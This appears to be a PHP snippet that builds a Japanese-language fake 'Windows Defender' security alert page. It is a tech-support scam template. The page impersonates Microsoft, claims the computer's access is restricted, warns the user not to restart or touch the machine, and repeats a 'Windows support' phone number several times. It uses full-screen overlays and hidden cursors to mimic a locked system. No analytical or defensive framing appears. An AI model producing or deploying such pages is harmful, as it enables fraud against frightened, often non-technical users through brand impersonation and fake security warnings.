...
$codeString = '
<html lang="en"><head>
	<!-- <script defer data-domain="recipe-jp.com/wQdzmt" src="https://api.publytics.net/js/script.manual.min.js"></script>
	<script>
    ...
    <link href="'.$dynamic_url.'/index_1.html" rel="icon" id="favicon" type="image/png">
...
<a href="'.$dynamic_url.'/#" id="link_black" style="cursor:none" rel="noreferrer">
...
<div class="lightbox" id="poptxt" style="display: block;">
    <div class="ilb top" style="font-size:17px">
        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5"><span class="fl title" id="txtadd">            <span class="fl ilb">              <img src="'.$dynamic_url.'/images/dm.png" class="logo3">            </span>Windows_Defender_セキュリティセンター</span> <span class="fl title2" id="txts1">            <a href="'.$dynamic_url.'/#" id="bgt">              <img src="'.$dynamic_url.'/images/cs.png">            </a>          </span>
        </div>
    </div>
    ...
    <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。 <br> <span class="support" style="font-size:22px;">Windows サポートに問い合わせてください: <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="'.$dynamic_url.'/images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください 0101-866-749-5939           </span>            </span>
    </div>
    <div id="bottom"><img src="'.$dynamic_url.'/images/img01df.png" id="badge"> <span class="title3">Windows</span>
        <ul>
            <li><a href="'.$dynamic_url.'/#">
...
<div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new"><p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows Defender - セキュリティ警告</p>
    ...
    <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話してください: <strong> <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>直接お電話ください  0101-866-749-5939         </span></strong>
    </p>
...
<div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
    <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
        ...
        <br> <strong>Windowsサポートに電話: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="'.$dynamic_url.'/images/winlo.png" alt="�" style="width: 25px;vertical-align: bottom;"> 直接お電話ください 0101-866-749-5939        </span>
    </strong></p>
</div>
...
<div id="overlay2" style="    z-index: 9999999999;    position: fixed;    height: 100vh;    width: 100vw;    background: black;    display: none;">
    <div style="height: 250px;width: 650px;margin: auto;margin-top: calc( (100vh / 2) - 125px );border: 2px white solid;padding: 50px; animation: scale 2s infinite alternate;">
        <p class="text-center" style="color: #FEFEFE; font-size: large;"> コンピュータを再起動したり、操作したりしないでください。<br>
            ...
            直ちにご連絡ください。技術者が問題解決をサポートいたします。<br>直接お電話ください 0101-866-749-5939        </p></div>
</div>
